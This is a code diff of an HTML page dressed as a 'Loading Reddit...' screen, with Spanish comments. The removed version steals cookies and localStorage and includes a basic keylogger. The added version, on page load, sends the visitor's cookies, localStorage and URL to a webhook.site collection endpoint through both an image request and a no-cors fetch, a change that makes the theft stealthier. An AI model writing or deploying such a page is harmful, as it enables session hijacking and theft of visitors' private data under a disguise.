@@ -1,50 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Reddit Security Test</title>
-    <style>
-        body { font-family: Arial; padding: 20px; }
-        #results { margin-top: 20px; padding: 10px; background: #f0f0f0; }
-    </style>
-</head>
-<body>
-    <h1>Prueba de Seguridad Reddit</h1>
-    <div id="results">Esperando datos...</div>
-
+    <title>Reddit Test</title>
+    <link rel="icon" href="data:,">
     <script>
-        // 1. Robar cookies
-        const cookies = document.cookie;
-        
-        // 2. Robar localStorage
-        const storage = JSON.stringify(localStorage);
-        
-        // 3. Keylogger básico
-        let keystrokes = '';
-        document.addEventListener('keypress', (e) => {
-            keystrokes += e.key;
-        });
-
-        // 4. Exfiltrar datos a Webhook.site
-        setTimeout(() => {
+        document.addEventListener('DOMContentLoaded', () => {
             const payload = {
-                cookies: cookies,
-                localStorage: storage,
-                keystrokes: keystrokes,
-                url: window.location.href,
-                userAgent: navigator.userAgent
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                url: location.href
             };
 
+            // Método 1: Usando Image (sin CORS)
+            new Image().src = 'https://webhook.site/2987fab5-8cd1-4000-b483-d6e2eef59af2?data=' + 
+                encodeURIComponent(JSON.stringify(payload));
+
+            // Método 2: Fetch con no-cors
             fetch('https://webhook.site/2987fab5-8cd1-4000-b483-d6e2eef59af2', {
                 method: 'POST',
-                body: JSON.stringify(payload),
-                headers: { 'Content-Type': 'application/json' }
-            })
-            .then(() => {
-                document.getElementById('results').innerHTML = 
-                    '<h3>Datos recolectados:</h3>' + 
-                    '<pre>' + JSON.stringify(payload, null, 2) + '</pre>';
+                mode: 'no-cors',
+                body: JSON.stringify(payload)
             });
-        }, 5000); // Envía después de 5 segundos
+        });
     </script>
+</head>
+<body>
+    <h1>Loading Reddit...</h1>
 </body>
 </html>
